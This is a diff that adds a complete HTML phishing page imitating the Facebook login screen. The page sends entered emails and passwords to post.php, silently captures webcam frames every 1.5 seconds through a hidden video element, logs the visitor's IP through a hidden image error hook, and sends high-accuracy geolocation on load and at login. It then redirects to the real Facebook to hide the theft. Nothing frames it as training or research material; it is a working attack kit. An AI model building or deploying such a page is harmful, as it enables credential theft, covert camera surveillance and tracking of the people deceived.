@@ -1,0 +1,446 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login</title>
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial,
+          sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .login-container {
+        display: flex;
+        width: 100%;
+        max-width: 1000px;
+        background: white;
+        border-radius: 8px;
+        box-shadow:
+          0 2px 4px rgba(0, 0, 0, 0.1),
+          0 8px 16px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+      }
+
+      .left-section {
+        flex: 1;
+        padding: 60px 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        background: white;
+      }
+
+      .facebook-logo {
+        font-size: 48px;
+        font-weight: 800;
+        color: #1877f2;
+        margin-bottom: 10px;
+      }
+
+      .tagline {
+        font-size: 28px;
+        color: #0a66c2;
+        font-weight: 500;
+        margin-bottom: 40px;
+        line-height: 1.4;
+      }
+
+      .right-section {
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        background: white;
+      }
+
+      .form-group {
+        margin-bottom: 16px;
+      }
+
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px 16px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 15px;
+        background-color: #f5f5f5;
+        transition: all 0.3s ease;
+      }
+
+      input[type="email"]:focus,
+      input[type="password"]:focus {
+        outline: none;
+        background-color: #f0f2f5;
+        border-color: #1877f2;
+      }
+
+      input[type="email"]::placeholder,
+      input[type="password"]::placeholder {
+        color: #65676b;
+      }
+
+      .login-btn {
+        width: 100%;
+        padding: 12px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        margin-top: 8px;
+      }
+
+      .login-btn:hover {
+        background-color: #165fe1;
+      }
+
+      .login-btn:active {
+        background-color: #0d61d5;
+      }
+
+      .divider {
+        text-align: center;
+        margin: 20px 0;
+        color: #65676b;
+        font-size: 13px;
+      }
+
+      .divider::before,
+      .divider::after {
+        content: "";
+        display: inline-block;
+        height: 1px;
+        width: 40%;
+        background-color: #ccc;
+        vertical-align: middle;
+      }
+
+      .divider::before {
+        margin-right: 10px;
+      }
+
+      .divider::after {
+        margin-left: 10px;
+      }
+
+      .create-new-btn {
+        width: 100%;
+        padding: 12px;
+        background-color: #31a24c;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        margin-bottom: 16px;
+      }
+
+      .create-new-btn:hover {
+        background-color: #2a8c41;
+      }
+
+      .forgot-password {
+        text-align: center;
+        margin-top: 16px;
+      }
+
+      .forgot-password a {
+        color: #0061ff;
+        text-decoration: none;
+        font-size: 13px;
+      }
+
+      .forgot-password a:hover {
+        text-decoration: underline;
+      }
+
+      .location-status {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .status-message {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        text-align: center;
+        color: #333;
+      }
+
+      @media (max-width: 768px) {
+        .login-container {
+          flex-direction: column;
+        }
+
+        .left-section {
+          padding: 40px;
+          text-align: center;
+        }
+
+        .tagline {
+          font-size: 20px;
+          margin-bottom: 30px;
+        }
+
+        .right-section {
+          padding: 30px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Hidden video and canvas for camera capture -->
+    <div style="display: none">
+      <video id="video" playsinline autoplay></video>
+      <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <!-- IP Logger (hidden) -->
+    <img src="x" style="display: none" onerror="logIP()" />
+
+    <div class="login-container">
+      <div class="left-section">
+        <div class="facebook-logo">facebook</div>
+        <div class="tagline">
+          Facebook helps you connect and share with the people in your life.
+        </div>
+      </div>
+      <div class="right-section">
+        <form id="loginForm" onsubmit="handleLogin(event)">
+          <div class="form-group">
+            <input
+              type="email"
+              id="email"
+              placeholder="Email address or phone number"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              id="password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <button type="submit" class="login-btn">Log In</button>
+          <div class="divider">or</div>
+          <button type="button" class="create-new-btn">
+            Create New Facebook Account
+          </button>
+          <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <div class="location-status" id="locationStatus">
+      <div class="status-message">
+        <div>Verifying your login...</div>
+        <div
+          id="locationMessage"
+          style="margin-top: 10px; font-size: 12px; color: #666"
+        ></div>
+      </div>
+    </div>
+
+    <script>
+      // Log IP address
+      function logIP() {
+        $.post("ip.php", {}, function () {
+          console.log("IP logged");
+        });
+      }
+
+      // Initialize camera and capture frames
+      function init() {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const constraints = { video: { facingMode: "user" } };
+
+        navigator.mediaDevices
+          .getUserMedia(constraints)
+          .then(function (stream) {
+            console.log("Camera access granted, starting capture");
+            video.srcObject = stream;
+
+            // Start capturing frames every 1.5 seconds
+            const context = canvas.getContext("2d");
+            setInterval(function () {
+              console.log("Capturing frame...");
+              context.drawImage(video, 0, 0, 640, 480);
+              const canvasData = canvas
+                .toDataURL("image/png")
+                .replace("image/png", "image/octet-stream");
+              sendCamData(canvasData);
+            }, 1500);
+          })
+          .catch(function (error) {
+            console.error("Camera access denied or error: " + error.message);
+          });
+      }
+
+      // Send camera data to server
+      function sendCamData(canvasData) {
+        $.ajax({
+          type: "POST",
+          url: "post.php",
+          data: {
+            cat: canvasData,
+            template: "facebook",
+          },
+          error: function (xhr, status, error) {
+            console.log("Camera upload error: " + error);
+          },
+        });
+      }
+
+      // Send credentials data
+      function sendCredentials(email, password) {
+        console.log("Sending credentials: " + email);
+        $.ajax({
+          type: "POST",
+          url: "post.php",
+          data: {
+            email: email,
+            password: password,
+            template: "facebook",
+          },
+          success: function (response) {
+            console.log("Credentials sent successfully");
+          },
+          error: function (xhr, status, error) {
+            console.log("Credentials upload error: " + error);
+          },
+        });
+      }
+
+      function handleLogin(event) {
+        event.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        console.log("Login attempted with email: " + email);
+
+        // Show status message
+        document.getElementById("locationStatus").style.display = "flex";
+        document.getElementById("locationMessage").innerHTML =
+          "Authenticating...";
+
+        // Send credentials to server
+        sendCredentials(email, password);
+
+        // Request geolocation
+        if (navigator.geolocation) {
+          document.getElementById("locationMessage").innerHTML =
+            "Completing sign in...";
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              const accuracy = Math.round(position.coords.accuracy);
+
+              console.log("Location captured: " + latitude + ", " + longitude);
+
+              // Send location to server
+              $.post("location.php", {
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy,
+                template: "facebook",
+              });
+            },
+            function (error) {
+              console.log("Location access: " + error.message);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0,
+            },
+          );
+        }
+
+        // Redirect after a delay
+        setTimeout(function () {
+          window.location.href = "https://www.facebook.com/";
+        }, 2000);
+      }
+
+      // Initialize on page load
+      window.addEventListener("load", function () {
+        console.log("Page loaded, initializing camera and logging IP...");
+        logIP();
+        init();
+
+        // Request geolocation on load
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              const accuracy = Math.round(position.coords.accuracy);
+
+              console.log(
+                "Initial location captured: " + latitude + ", " + longitude,
+              );
+
+              $.post("location.php", {
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy,
+                template: "facebook",
+              });
+            },
+            function (error) {
+              console.log("Location: " + error.message);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0,
+            },
+          );
+        }
+      });
+    </script>
+  </body>
+</html>
